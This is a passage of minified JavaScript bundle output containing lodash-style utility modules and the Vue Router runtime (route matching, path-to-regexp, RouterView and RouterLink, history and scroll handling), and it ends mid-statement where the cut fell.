r=t(317),o=/[^.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|$))/g,a=/\\(\\)?/g,i=r((function(n){var e=[];return 46===n.charCodeAt(0)&&e.push(""),n.replace(o,(function(n,t,r,o){e.push(r?o.replace(a,"$1"):t||n)})),e}));n.exports=i},function(n,e,t){var r=t(318);n.exports=function(n){var e=r(n,(function(n){return 500===t.size&&t.clear(),n})),t=e.cache;return e}},function(n,e,t){var r=t(112);function o(n,e){if("function"!=typeof n||null!=e&&"function"!=typeof e)throw new TypeError("Expected a function");var t=function(){var r=arguments,o=e?e.apply(this,r):r[0],a=t.cache;if(a.has(o))return a.get(o);var i=n.apply(this,r);return t.cache=a.set(o,i)||a,i};return t.cache=new(o.Cache||r),t}o.Cache=r,n.exports=o},function(n,e,t){var r=t(320);n.exports=function(n){return null==n?"":r(n)}},function(n,e,t){var r=t(56),o=t(321),a=t(23),i=t(116),s=r?r.prototype:void 0,l=s?s.toString:void 0;n.exports=function n(e){if("string"==typeof e)return e;if(a(e))return o(e,n)+"";if(i(e))return l?l.call(e):"";var t=e+"";return"0"==t&&1/e==-1/0?"-0":t}},function(n,e){n.exports=function(n,e){for(var t=-1,r=null==n?0:n.length,o=Array(r);++t<r;)o[t]=e(n[t],t,n);return o}},function(n,e,t){var r=t(323),o=t(324);n.exports=function(n,e){return null!=n&&o(n,e,r)}},function(n,e){n.exports=function(n,e){return null!=n&&e in Object(n)}},function(n,e,t){var r=t(185),o=t(109),a=t(23),i=t(178),s=t(114),l=t(84);n.exports=function(n,e,t){for(var c=-1,u=(e=r(e,n)).length,d=!1;++c<u;){var p=l(e[c]);if(!(d=null!=n&&t(n,p)))break;n=n[p]}return d||++c!=u?d:!!(u=null==n?0:n.length)&&s(u)&&i(p,u)&&(a(n)||o(n))}},function(n,e,t){var r=t(326),o=t(327),a=t(115),i=t(84);n.exports=function(n){return a(n)?r(i(n)):o(n)}},function(n,e){n.exports=function(n){return function(e){return null==e?void 0:e[n]}}},function(n,e,t){var r=t(184);n.exports=function(n){return function(e){return r(e,n)}}},function(n,e,t){var r=t(117),o=t(329),a=t(331);n.exports=function(n,e){return a(o(n,e,r),n+"")}},function(n,e,t){var r=t(330),o=Math.max;n.exports=function(n,e,t){return e=o(void 0===e?n.length-1:e,0),function(){for(var a=arguments,i=-1,s=o(a.length-e,0),l=Array(s);++i<s;)l[i]=a[e+i];i=-1;for(var c=Array(e+1);++i<e;)c[i]=a[i];return c[e]=t(l),r(n,this,c)}}},function(n,e){n.exports=function(n,e,t){switch(t.length){case 0:return n.call(e);case 1:return n.call(e,t[0]);case 2:return n.call(e,t[0],t[1]);case 3:return n.call(e,t[0],t[1],t[2])}return n.apply(e,t)}},function(n,e,t){var r=t(332),o=t(335)(r);n.exports=o},function(n,e,t){var r=t(333),o=t(334),a=t(117),i=o?function(n,e){return o(n,"toString",{configurable:!0,enumerable:!1,value:r(e),writable:!0})}:a;n.exports=i},function(n,e){n.exports=function(n){return function(){return n}}},function(n,e,t){var r=t(32),o=function(){try{var n=r(Object,"defineProperty");return n({},"",{}),n}catch(n){}}();n.exports=o},function(n,e){var t=Date.now;n.exports=function(n){var e=0,r=0;return function(){var o=t(),a=16-(o-r);if(r=o,a>0){if(++e>=800)return arguments[0]}else e=0;return n.apply(void 0,arguments)}}},function(n,e,t){var r=t(174),o=t(337),a=t(342),i=t(175),s=t(343),l=t(113);n.exports=function(n,e,t){var c=-1,u=o,d=n.length,p=!0,f=[],h=f;if(t)p=!1,u=a;else if(d>=200){var m=e?null:s(n);if(m)return l(m);p=!1,u=i,h=new r}else h=e?[]:f;n:for(;++c<d;){var v=n[c],y=e?e(v):v;if(v=t||0!==v?v:0,p&&y==y){for(var g=h.length;g--;)if(h[g]===y)continue n;e&&h.push(y),f.push(v)}else u(h,y,t)||(h!==f&&h.push(y),f.push(v))}return f}},function(n,e,t){var r=t(338);n.exports=function(n,e){return!!(null==n?0:n.length)&&r(n,e,0)>-1}},function(n,e,t){var r=t(339),o=t(340),a=t(341);n.exports=function(n,e,t){return e==e?a(n,e,t):r(n,o,t)}},function(n,e){n.exports=function(n,e,t,r){for(var o=n.length,a=t+(r?1:-1);r?a--:++a<o;)if(e(n[a],a,n))return a;return-1}},function(n,e){n.exports=function(n){return n!=n}},function(n,e){n.exports=function(n,e,t){for(var r=t-1,o=n.length;++r<o;)if(n[r]===e)return r;return-1}},function(n,e){n.exports=function(n,e,t){for(var r=-1,o=null==n?0:n.length;++r<o;)if(t(e,n[r]))return!0;return!1}},function(n,e,t){var r=t(181),o=t(344),a=t(113),i=r&&1/a(new r([,-0]))[1]==1/0?function(n){return new r(n)}:o;n.exports=i},function(n,e){n.exports=function(){}},function(n,e,t){var r=t(180),o=t(39);n.exports=function(n){return o(n)&&r(n)}},function(n,e,t){},function(n,e,t){},function(n,e,t){},function(n,e,t){"use strict";var r=t(0),o=t(3),a=t(31),i=t(7),s=t(11),l=t(54),c=t(48),u=r.Function,d=o([].concat),p=o([].join),f={},h=function(n,e,t){if(!s(f,e)){for(var r=[],o=0;o<e;o++)r[o]="a["+o+"]";f[e]=u("C,a","return new C("+p(r,",")+")")}return f[e](n,t)};n.exports=c?u.bind:function(n){var e=a(this),t=e.prototype,r=l(arguments,1),o=function(){var t=d(r,l(arguments));return this instanceof o?h(e,t.length,t):e.apply(n,t)};return i(t)&&(o.prototype=t),o}},function(n,e,t){"use strict";t(189)},function(n,e,t){"use strict";t(190)},function(n,e,t){"use strict";t.r(e);t(127),t(222),t(231),t(233);var r=t(77),o=(t(126),t(62),t(8),t(18),t(20),t(87),t(40),t(1));function a(n,e){for(var t in e)n[t]=e[t];return n}var i=/[!'()*]/g,s=function(n){return"%"+n.charCodeAt(0).toString(16)},l=/%2C/g,c=function(n){return encodeURIComponent(n).replace(i,s).replace(l,",")};function u(n){try{return decodeURIComponent(n)}catch(n){0}return n}var d=function(n){return null==n||"object"==typeof n?n:String(n)};function p(n){var e={};return(n=n.trim().replace(/^(\?|#|&)/,""))?(n.split("&").forEach((function(n){var t=n.replace(/\+/g," ").split("="),r=u(t.shift()),o=t.length>0?u(t.join("=")):null;void 0===e[r]?e[r]=o:Array.isArray(e[r])?e[r].push(o):e[r]=[e[r],o]})),e):e}function f(n){var e=n?Object.keys(n).map((function(e){var t=n[e];if(void 0===t)return"";if(null===t)return c(e);if(Array.isArray(t)){var r=[];return t.forEach((function(n){void 0!==n&&(null===n?r.push(c(e)):r.push(c(e)+"="+c(n)))})),r.join("&")}return c(e)+"="+c(t)})).filter((function(n){return n.length>0})).join("&"):null;return e?"?"+e:""}var h=/\/?$/;function m(n,e,t,r){var o=r&&r.options.stringifyQuery,a=e.query||{};try{a=v(a)}catch(n){}var i={name:e.name||n&&n.name,meta:n&&n.meta||{},path:e.path||"/",hash:e.hash||"",query:a,params:e.params||{},fullPath:b(e,o),matched:n?g(n):[]};return t&&(i.redirectedFrom=b(t,o)),Object.freeze(i)}function v(n){if(Array.isArray(n))return n.map(v);if(n&&"object"==typeof n){var e={};for(var t in n)e[t]=v(n[t]);return e}return n}var y=m(null,{path:"/"});function g(n){for(var e=[];n;)e.unshift(n),n=n.parent;return e}function b(n,e){var t=n.path,r=n.query;void 0===r&&(r={});var o=n.hash;return void 0===o&&(o=""),(t||"/")+(e||f)(r)+o}function E(n,e,t){return e===y?n===e:!!e&&(n.path&&e.path?n.path.replace(h,"")===e.path.replace(h,"")&&(t||n.hash===e.hash&&x(n.query,e.query)):!(!n.name||!e.name)&&(n.name===e.name&&(t||n.hash===e.hash&&x(n.query,e.query)&&x(n.params,e.params))))}function x(n,e){if(void 0===n&&(n={}),void 0===e&&(e={}),!n||!e)return n===e;var t=Object.keys(n).sort(),r=Object.keys(e).sort();return t.length===r.length&&t.every((function(t,o){var a=n[t];if(r[o]!==t)return!1;var i=e[t];return null==a||null==i?a===i:"object"==typeof a&&"object"==typeof i?x(a,i):String(a)===String(i)}))}function w(n){for(var e=0;e<n.matched.length;e++){var t=n.matched[e];for(var r in t.instances){var o=t.instances[r],a=t.enteredCbs[r];if(o&&a){delete t.enteredCbs[r];for(var i=0;i<a.length;i++)o._isBeingDestroyed||a[i](o)}}}}var k={name:"RouterView",functional:!0,props:{name:{type:String,default:"default"}},render:function(n,e){var t=e.props,r=e.children,o=e.parent,i=e.data;i.routerView=!0;for(var s=o.$createElement,l=t.name,c=o.$route,u=o._routerViewCache||(o._routerViewCache={}),d=0,p=!1;o&&o._routerRoot!==o;){var f=o.$vnode?o.$vnode.data:{};f.routerView&&d++,f.keepAlive&&o._directInactive&&o._inactive&&(p=!0),o=o.$parent}if(i.routerViewDepth=d,p){var h=u[l],m=h&&h.component;return m?(h.configProps&&A(m,i,h.route,h.configProps),s(m,i,r)):s()}var v=c.matched[d],y=v&&v.components[l];if(!v||!y)return u[l]=null,s();u[l]={component:y},i.registerRouteInstance=function(n,e){var t=v.instances[l];(e&&t!==n||!e&&t===n)&&(v.instances[l]=e)},(i.hook||(i.hook={})).prepatch=function(n,e){v.instances[l]=e.componentInstance},i.hook.init=function(n){n.data.keepAlive&&n.componentInstance&&n.componentInstance!==v.instances[l]&&(v.instances[l]=n.componentInstance),w(c)};var g=v.props&&v.props[l];return g&&(a(u[l],{route:c,configProps:g}),A(y,i,c,g)),s(y,i,r)}};function A(n,e,t,r){var o=e.props=function(n,e){switch(typeof e){case"undefined":return;case"object":return e;case"function":return e(n);case"boolean":return e?n.params:void 0;default:0}}(t,r);if(o){o=e.props=a({},o);var i=e.attrs=e.attrs||{};for(var s in o)n.props&&s in n.props||(i[s]=o[s],delete o[s])}}function j(n,e,t){var r=n.charAt(0);if("/"===r)return n;if("?"===r||"#"===r)return e+n;var o=e.split("/");t&&o[o.length-1]||o.pop();for(var a=n.replace(/^\//,"").split("/"),i=0;i<a.length;i++){var s=a[i];".."===s?o.pop():"."!==s&&o.push(s)}return""!==o[0]&&o.unshift(""),o.join("/")}function B(n){return n.replace(/\/+/g,"/")}var C=Array.isArray||function(n){return"[object Array]"==Object.prototype.toString.call(n)},T=q,S=z,_=function(n,e){return F(z(n,e),e)},P=F,O=R,I=new RegExp(["(\\\\.)","([\\/.])?(?:(?:\\:(\\w+)(?:\\(((?:\\\\.|[^\\\\()])+)\\))?|\\(((?:\\\\.|[^\\\\()])+)\\))([+*?])?|(\\*))"].join("|"),"g");function z(n,e){for(var t,r=[],o=0,a=0,i="",s=e&&e.delimiter||"/";null!=(t=I.exec(n));){var l=t[0],c=t[1],u=t.index;if(i+=n.slice(a,u),a=u+l.length,c)i+=c[1];else{var d=n[a],p=t[2],f=t[3],h=t[4],m=t[5],v=t[6],y=t[7];i&&(r.push(i),i="");var g=null!=p&&null!=d&&d!==p,b="+"===v||"*"===v,E="?"===v||"*"===v,x=t[2]||s,w=h||m;r.push({name:f||o++,prefix:p||"",delimiter:x,optional:E,repeat:b,partial:g,asterisk:!!y,pattern:w?L(w):y?".*":"[^"+$(x)+"]+?"})}}return a<n.length&&(i+=n.substr(a)),i&&r.push(i),r}function D(n){return encodeURI(n).replace(/[\/?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()}))}function F(n,e){for(var t=new Array(n.length),r=0;r<n.length;r++)"object"==typeof n[r]&&(t[r]=new RegExp("^(?:"+n[r].pattern+")$",V(e)));return function(e,r){for(var o="",a=e||{},i=(r||{}).pretty?D:encodeURIComponent,s=0;s<n.length;s++){var l=n[s];if("string"!=typeof l){var c,u=a[l.name];if(null==u){if(l.optional){l.partial&&(o+=l.prefix);continue}throw new TypeError('Expected "'+l.name+'" to be defined')}if(C(u)){if(!l.repeat)throw new TypeError('Expected "'+l.name+'" to not repeat, but received `'+JSON.stringify(u)+"`");if(0===u.length){if(l.optional)continue;throw new TypeError('Expected "'+l.name+'" to not be empty')}for(var d=0;d<u.length;d++){if(c=i(u[d]),!t[s].test(c))throw new TypeError('Expected all "'+l.name+'" to match "'+l.pattern+'", but received `'+JSON.stringify(c)+"`");o+=(0===d?l.prefix:l.delimiter)+c}}else{if(c=l.asterisk?encodeURI(u).replace(/[?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()})):i(u),!t[s].test(c))throw new TypeError('Expected "'+l.name+'" to match "'+l.pattern+'", but received "'+c+'"');o+=l.prefix+c}}else o+=l}return o}}function $(n){return n.replace(/([.+*?=^!:${}()[\]|\/\\])/g,"\\$1")}function L(n){return n.replace(/([=!:$\/()])/g,"\\$1")}function M(n,e){return n.keys=e,n}function V(n){return n&&n.sensitive?"":"i"}function R(n,e,t){C(e)||(t=e||t,e=[]);for(var r=(t=t||{}).strict,o=!1!==t.end,a="",i=0;i<n.length;i++){var s=n[i];if("string"==typeof s)a+=$(s);else{var l=$(s.prefix),c="(?:"+s.pattern+")";e.push(s),s.repeat&&(c+="(?:"+l+c+")*"),a+=c=s.optional?s.partial?l+"("+c+")?":"(?:"+l+"("+c+"))?":l+"("+c+")"}}var u=$(t.delimiter||"/"),d=a.slice(-u.length)===u;return r||(a=(d?a.slice(0,-u.length):a)+"(?:"+u+"(?=$))?"),a+=o?"$":r&&d?"":"(?="+u+"|$)",M(new RegExp("^"+a,V(t)),e)}function q(n,e,t){return C(e)||(t=e||t,e=[]),t=t||{},n instanceof RegExp?function(n,e){var t=n.source.match(/\((?!\?)/g);if(t)for(var r=0;r<t.length;r++)e.push({name:r,prefix:null,delimiter:null,optional:!1,repeat:!1,partial:!1,asterisk:!1,pattern:null});return M(n,e)}(n,e):C(n)?function(n,e,t){for(var r=[],o=0;o<n.length;o++)r.push(q(n[o],e,t).source);return M(new RegExp("(?:"+r.join("|")+")",V(t)),e)}(n,e,t):function(n,e,t){return R(z(n,t),e,t)}(n,e,t)}T.parse=S,T.compile=_,T.tokensToFunction=P,T.tokensToRegExp=O;var H=Object.create(null);function N(n,e,t){e=e||{};try{var r=H[n]||(H[n]=T.compile(n));return"string"==typeof e.pathMatch&&(e[0]=e.pathMatch),r(e,{pretty:!0})}catch(n){return""}finally{delete e[0]}}function U(n,e,t,r){var o="string"==typeof n?{path:n}:n;if(o._normalized)return o;if(o.name){var i=(o=a({},n)).params;return i&&"object"==typeof i&&(o.params=a({},i)),o}if(!o.path&&o.params&&e){(o=a({},o))._normalized=!0;var s=a(a({},e.params),o.params);if(e.name)o.name=e.name,o.params=s;else if(e.matched.length){var l=e.matched[e.matched.length-1].path;o.path=N(l,s,e.path)}else 0;return o}var c=function(n){var e="",t="",r=n.indexOf("#");r>=0&&(e=n.slice(r),n=n.slice(0,r));var o=n.indexOf("?");return o>=0&&(t=n.slice(o+1),n=n.slice(0,o)),{path:n,query:t,hash:e}}(o.path||""),u=e&&e.path||"/",f=c.path?j(c.path,u,t||o.append):u,h=function(n,e,t){void 0===e&&(e={});var r,o=t||p;try{r=o(n||"")}catch(n){r={}}for(var a in e){var i=e[a];r[a]=Array.isArray(i)?i.map(d):d(i)}return r}(c.query,o.query,r&&r.options.parseQuery),m=o.hash||c.hash;return m&&"#"!==m.charAt(0)&&(m="#"+m),{_normalized:!0,path:f,query:h,hash:m}}var J,W=function(){},X={name:"RouterLink",props:{to:{type:[String,Object],required:!0},tag:{type:String,default:"a"},custom:Boolean,exact:Boolean,exactPath:Boolean,append:Boolean,replace:Boolean,activeClass:String,exactActiveClass:String,ariaCurrentValue:{type:String,default:"page"},event:{type:[String,Array],default:"click"}},render:function(n){var e=this,t=this.$router,r=this.$route,o=t.resolve(this.to,r,this.append),i=o.location,s=o.route,l=o.href,c={},u=t.options.linkActiveClass,d=t.options.linkExactActiveClass,p=null==u?"router-link-active":u,f=null==d?"router-link-exact-active":d,v=null==this.activeClass?p:this.activeClass,y=null==this.exactActiveClass?f:this.exactActiveClass,g=s.redirectedFrom?m(null,U(s.redirectedFrom),null,t):s;c[y]=E(r,g,this.exactPath),c[v]=this.exact||this.exactPath?c[y]:function(n,e){return 0===n.path.replace(h,"/").indexOf(e.path.replace(h,"/"))&&(!e.hash||n.hash===e.hash)&&function(n,e){for(var t in e)if(!(t in n))return!1;return!0}(n.query,e.query)}(r,g);var b=c[y]?this.ariaCurrentValue:null,x=function(n){G(n)&&(e.replace?t.replace(i,W):t.push(i,W))},w={click:G};Array.isArray(this.event)?this.event.forEach((function(n){w[n]=x})):w[this.event]=x;var k={class:c},A=!this.$scopedSlots.$hasNormal&&this.$scopedSlots.default&&this.$scopedSlots.default({href:l,route:s,navigate:x,isActive:c[v],isExactActive:c[y]});if(A){if(1===A.length)return A[0];if(A.length>1||!A.length)return 0===A.length?n():n("span",{},A)}if("a"===this.tag)k.on=w,k.attrs={href:l,"aria-current":b};else{var j=function n(e){var t;if(e)for(var r=0;r<e.length;r++){if("a"===(t=e[r]).tag)return t;if(t.children&&(t=n(t.children)))return t}}(this.$slots.default);if(j){j.isStatic=!1;var B=j.data=a({},j.data);for(var C in B.on=B.on||{},B.on){var T=B.on[C];C in w&&(B.on[C]=Array.isArray(T)?T:[T])}for(var S in w)S in B.on?B.on[S].push(w[S]):B.on[S]=x;var _=j.data.attrs=a({},j.data.attrs);_.href=l,_["aria-current"]=b}else k.on=w}return n(this.tag,k,this.$slots.default)}};function G(n){if(!(n.metaKey||n.altKey||n.ctrlKey||n.shiftKey||n.defaultPrevented||void 0!==n.button&&0!==n.button)){if(n.currentTarget&&n.currentTarget.getAttribute){var e=n.currentTarget.getAttribute("target");if(/\b_blank\b/i.test(e))return}return n.preventDefault&&n.preventDefault(),!0}}var K="undefined"!=typeof window;function Y(n,e,t,r,o){var a=e||[],i=t||Object.create(null),s=r||Object.create(null);n.forEach((function(n){!function n(e,t,r,o,a,i){var s=o.path,l=o.name;0;var c=o.pathToRegexpOptions||{},u=function(n,e,t){t||(n=n.replace(/\/$/,""));if("/"===n[0])return n;if(null==e)return n;return B(e.path+"/"+n)}(s,a,c.strict);"boolean"==typeof o.caseSensitive&&(c.sensitive=o.caseSensitive);var d={path:u,regex:Q(u,c),components:o.components||{default:o.component},alias:o.alias?"string"==typeof o.alias?[o.alias]:o.alias:[],instances:{},enteredCbs:{},name:l,parent:a,matchAs:i,redirect:o.redirect,beforeEnter:o.beforeEnter,meta:o.meta||{},props:null==o.props?{}:o.components?o.props:{default:o.props}};o.children&&o.children.forEach((function(o){var a=i?B(i+"/"+o.path):void 0;n(e,t,r,o,d,a)}));t[d.path]||(e.push(d.path),t[d.path]=d);if(void 0!==o.alias)for(var p=Array.isArray(o.alias)?o.alias:[o.alias],f=0;f<p.length;++f){0;var h={path:p[f],children:o.children};n(e,t,r,h,a,d.path||"/")}l&&(r[l]||(r[l]=d))}(a,i,s,n,o)}));for(var l=0,c=a.length;l<c;l++)"*"===a[l]&&(a.push(a.splice(l,1)[0]),c--,l--);return{pathList:a,pathMap:i,nameMap:s}}function Q(n,e){return T(n,[],e)}function Z(n,e){var t=Y(n),r=t.pathList,o=t.pathMap,a=t.nameMap;function i(n,t,i){var s=U(n,t,!1,e),c=s.name;if(c){var u=a[c];if(!u)return l(null,s);var d=u.regex.keys.filter((function(n){return!n.optional})).map((function(n){return n.name}));if("object"!=typeof s.params&&(s.params={}),t&&"object"==typeof t.params)for(var p in t.params)!(p in s.params)&&d.indexOf(p)>-1&&(s.params[p]=t.params[p]);return s.path=N(u.path,s.params),l(u,s,i)}if(s.path){s.params={};for(var f=0;f<r.length;f++){var h=r[f],m=o[h];if(nn(m.regex,s.path,s.params))return l(m,s,i)}}return l(null,s)}function s(n,t){var r=n.redirect,o="function"==typeof r?r(m(n,t,null,e)):r;if("string"==typeof o&&(o={path:o}),!o||"object"!=typeof o)return l(null,t);var s=o,c=s.name,u=s.path,d=t.query,p=t.hash,f=t.params;if(d=s.hasOwnProperty("query")?s.query:d,p=s.hasOwnProperty("hash")?s.hash:p,f=s.hasOwnProperty("params")?s.params:f,c){a[c];return i({_normalized:!0,name:c,query:d,hash:p,params:f},void 0,t)}if(u){var h=function(n,e){return j(n,e.parent?e.parent.path:"/",!0)}(u,n);return i({_normalized:!0,path:N(h,f),query:d,hash:p},void 0,t)}return l(null,t)}function l(n,t,r){return n&&n.redirect?s(n,r||t):n&&n.matchAs?function(n,e,t){var r=i({_normalized:!0,path:N(t,e.params)});if(r){var o=r.matched,a=o[o.length-1];return e.params=r.params,l(a,e)}return l(null,e)}(0,t,n.matchAs):m(n,t,r,e)}return{match:i,addRoute:function(n,e){var t="object"!=typeof n?a[n]:void 0;Y([e||n],r,o,a,t),t&&t.alias.length&&Y(t.alias.map((function(n){return{path:n,children:[e]}})),r,o,a,t)},getRoutes:function(){return r.map((function(n){return o[n]}))},addRoutes:function(n){Y(n,r,o,a)}}}function nn(n,e,t){var r=e.match(n);if(!r)return!1;if(!t)return!0;for(var o=1,a=r.length;o<a;++o){var i=n.keys[o-1];i&&(t[i.name||"pathMatch"]="string"==typeof r[o]?u(r[o]):r[o])}return!0}var en=K&&window.performance&&window.performance.now?window.performance:Date;function tn(){return en.now().toFixed(3)}var rn=tn();function on(){return rn}function an(n){return rn=n}var sn=Object.create(null);function ln(){"scrollRestoration"in window.history&&(window.history.scrollRestoration="manual");var n=window.location.protocol+"//"+window.location.host,e=window.location.href.replace(n,""),t=a({},window.history.state);return t.key=on(),window.history.replaceState(t,"",e),window.addEventListener("popstate",dn),function(){window.removeEventListener("popstate",dn)}}function cn(n,e,t,r){if(n.app){var o=n.options.scrollBehavior;o&&n.app.$nextTick((function(){var a=function(){var n=on();if(n)return sn[n]}(),i=o.call(n,e,t,r?a:null);i&&("function"==typeof i.then?i.then((function(n){vn(n,a)})).catch((function(n){0})):vn(i,a))}))}}function un(){var n=on();n&&(sn[n]={x:window.pageXOffset,y:window.pageYOffset})}function dn(n){un(),n.state&&n.state.key&&an(n.state.key)}function pn(n){return hn(n.x)||hn(n.y)}function fn(n){return{x:hn(n.x)?n.x:window.pageXOffset,y:hn(n.y)?n.y:window.pageYOffset}}function hn(n){return"number"==typeof n}var mn=/^#\d/;function vn(n,e){var t,r="object"==typeof n;if(r&&"string"==typeof n.selector){var o=mn.test(n.selector)?document.getElementById(n.selector.slice(1)):document.querySelector(n.selector);if(o){var a=n.offset&&"object"==typeof n.offset?n.offset:{};e=function(n,e){var t=document.documentElement.getBoundingClientRect(),r=n.getBoundingClientRect();return{x:r.left-t.left-e.x,y:r.top-t.top-e.y}}(o,a={x:hn((t=a).x)?t.x:0,y:hn(t.y)?t.y:0})}else pn(n)&&(e=fn(n))}else r&&pn(n)&&(e=fn(n));e&&("scrollBehavior"in document.documentElement.style?window.scrollTo({left:e.x,top:e.y,behavior:n.behavior}):window.scrollTo(e.x,e.y))}var yn,gn=K&&((-1===(yn=window.navigator.userAgent).indexOf("Android 2.")&&-1===yn.indexOf("Android 4.0")||-1===yn.indexOf("Mobile Safari")||-1!==yn.indexOf("Chrome")||-1!==yn.indexOf("Windows Phone"))&&window.history&&"function"==typeof window.history.pushState);function bn(n,e){un();var t=window.history;try{if(e){var r=a({},t.state);r.key=on(),t.replaceState(r,"",n)}else t.pushState({key:an(tn())},"",n)}catch(t){window.location[e?"replace":"assign"](n)}}function En(n){bn(n,!0)}function xn(n,e,t){var r=function(o){o>=n.length?t():n[o]?e(n[o],(function(){r(o+1)})):r(o+1)};r(0)}var wn={redirected:2,aborted:4,cancelled:8,duplicated:16};function kn(n,e){return jn(n,e,wn.redirected,'Redirected when going from "'+n.fullPath+'" to "'+function(n){if("string"==typeof n)return n;if("path"in n)return n.path;var e={};return Bn.forEach((function(t){t in n&&(e[t]=n[t])})),JSON.stringify(e,null,2)}(e)+'" via a navigation guard.')}function An(n,e){return jn(n,e,wn.cancelled,'Navigation cancelled from "'+n.fullPath+'" to "'+e.fullPath+'" with a new navigation.')}function jn(n,e,t,r){var o=new Error(r);return o._isRouter=!0,o.from=n,o.to=e,o.type=t,o}var Bn=["params","query","hash"];function Cn(n){return Object.prototype.toString.call(n).indexOf("Error")>-1}function Tn(n,e){return Cn(n)&&n._isRouter&&(null==e||n.type===e)}function Sn(n){return function(e,t,r){var o=!1,a=0,i=null;_n(n,(function(n,e,t,s){if("function"==typeof n&&void 0===n.cid){o=!0,a++;var l,c=In((function(e){var o;((o=e).__esModule||On&&"Module"===o[Symbol.toStringTag])&&(e=e.default),n.resolved="function"==typeof e?e:J.extend(e),t.components[s]=e,--a<=0&&r()})),u=In((function(n){var e="Failed to resolve async component "+s+": "+n;i||(i=Cn(n)?n:new Error(e),r(i))}));try{l=n(c,u)}catch(n){u(n)}if(l)if("function"==typeof l.then)l.then(c,u);else{var d=l.component;d&&"function"==typeof d.then&&d.then(c,u)}}})),o||r()}}function _n(n,e){return Pn(n.map((function(n){return Object.keys(n.components).map((function(t){return e(n.components[t],n.instances[t],n,t)}))})))}function Pn(n){return Array.prototype.concat.apply([],n)}var On="function"==typeof Symbol&&"symbol"==typeof Symbol.toStringTag;function In(n){var e=!1;return function(){for(var t=[],r=arguments.length;r--;)t[r]=arguments[r];if(!e)return e=!0,n.apply(this,t)}}var zn=function(n,e){this.router=n,this.base=function(n){if(!n)if(K){var e=document.querySelector("base");n=(n=e&&e.getAttribute("href")||"/").replace(/^https?:\/\/[^\/]+/,"")}else n="/";"/"!==n.charAt(0)&&(n="/"+n);return n.replace(/\/$/,"")}(e),this.current=y,this.pending=null,this.ready=!1,this.readyCbs=[],this.readyErrorCbs=[],this.errorCbs=[],this.listeners=[]};function Dn(n,e,t,r){var o=_n(n,(function(n,r,o,a){var i=function(n,e){"function"!=typeof n&&(n=J.extend(n));return n.options[e]}(n,e);if(i)return Array.isArray(i)?i.map((function(n){return t(n,r,o,a)})):t(i,r,o,a)}));return Pn(r?o.reverse():o)}function Fn(n,e){if(e)return function(){return n.apply(e,arguments)}}zn.prototype.listen=function(n){this.cb=n},zn.prototype.onReady=function(n,e){this.ready?n():(this.readyCbs.push(n),e&&this.readyErrorCbs.push(e))},zn.prototype.onError=function(n){this.errorCbs.push(n)},zn.prototype.transitionTo=function(n,e,t){var r,o=this;try{r=this.router.match(n,this.current)}catch(n){throw this.errorCbs.forEach((function(e){e(n)})),n}var a=this.current;this.confirmTransition(r,(function(){o.updateRoute(r),e&&e(r),o.ensureURL(),o.router.afterHooks.forEach((function(n){n&&n(r,a)})),o.ready||(o.ready=!0,o.readyCbs.forEach((function(n){n(r)})))}),(function(n){t&&t(n),n&&!o.ready&&(Tn(n,wn.redirected)&&a===y||(o.ready=!0,o.readyErrorCbs.forEach((function(e){e(n)}))))}))},zn.prototype.confirmTransition=function(n,e,t){var r=this,o=this.current;this.pending=n;var a,i,s=function(n){!Tn(n)&&Cn(n)&&(r.errorCbs.length?r.errorCbs.forEach((function(e){e(n)})):console.error(n)),t&&t(n)},l=n.matched.length-1,c=o.matched.length-1;if(E(n,o)&&l===c&&n.matched[l]===o.matched[c])return this.ensureURL(),n.hash&&cn(this.router,o,n,!1),s(((i=jn(a=o,n,wn.duplicated,'Avoided redundant navigation to current location: "'+a.fullPath+'".')).name="NavigationDuplicated",i));var u=function(n,e){var t,r=Math.max(n.length,e.length);for(t=0;t<r&&n[t]===e[t];t++);return{updated:e.slice(0,t),activated:e.slice(t),deactivated:n.slice(t)}}(this.current.matched,n.matched),d=u.updated,p=u.deactivated,f=u.activated,h=[].concat(function(n){return Dn(n,"beforeRouteLeave",Fn,!0)}(p),this.router.beforeHooks,function(n){return Dn(n,"beforeRouteUpdate",Fn)}(d),f.map((function(n){return n.beforeEnter})),Sn(f)),m=function(e,t){if(r.pending!==n)return s(An(o,n));try{e(n,o,(function(e){!1===e?(r.ensureURL(!0),s(function(n,e){return jn(n,e,wn.aborted,'Navigation aborted from "'+n.fullPath+'" to "'+e.fullPath+'" via a navigation guard.')}(o,n))):Cn(e)?(r.ensureURL(!0),s(e)):"string"==typeof e||"object"==typeof e&&("string"==typeof e.path||"string"==typeof e.name)?(s(kn(o,n)),"object"==typeof e&&e.replace?r.replace(e):r.push(e)):t(e)}))}catch(n){s(n)}};xn(h,m,(function(){xn(function(n){return Dn(n,"beforeRouteEnter",(function(n,e,t,r){return function(n,e,t){return function(r,o,a){return n(r,o,(function(n){"function"==typeof n&&(e.enteredCbs[t]||(e.enteredCbs[t]=[]),e.enteredCbs[t].push(n)),a(n)}))}}(n,t,r)}))}(f).concat(r.router.resolveHooks),m,(function(){if(r.pending!==n)return s(An(o,n));r.pending=null,e(n),r.router.app&&r.router.app.$nextTick((function(){w(n)}))}))}))},zn.prototype.updateRoute=function(n){this.current=n,this.cb&&this.cb(n)},zn.prototype.setupListeners=function(){},zn.prototype.teardown=function(){this.listeners.forEach((function(n){n()})),this.listeners=[],this.current=y,this.pending=null};var $n=function(n){function e(e,t){n.call(this,e,t),this._startLocation=Ln(this.base)}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router,t=e.options.scrollBehavior,r=gn&&t;r&&this.listeners.push(ln());var o=function(){var t=n.current,o=Ln(n.base);n.current===y&&o===n._startLocation||n.transitionTo(o,(function(n){r&&cn(e,n,t,!0)}))};window.addEventListener("popstate",o),this.listeners.push((function(){window.removeEventListener("popstate",o)}))}},e.prototype.go=function(n){window.history.go(n)},e.prototype.push=function(n,e,t){var r=this,o=this.current;this.transitionTo(n,(function(n){bn(B(r.base+n.fullPath)),cn(r.router,n,o,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,o=this.current;this.transitionTo(n,(function(n){En(B(r.base+n.fullPath)),cn(r.router,n,o,!1),e&&e(n)}),t)},e.prototype.ensureURL=function(n){if(Ln(this.base)!==this.current.fullPath){var 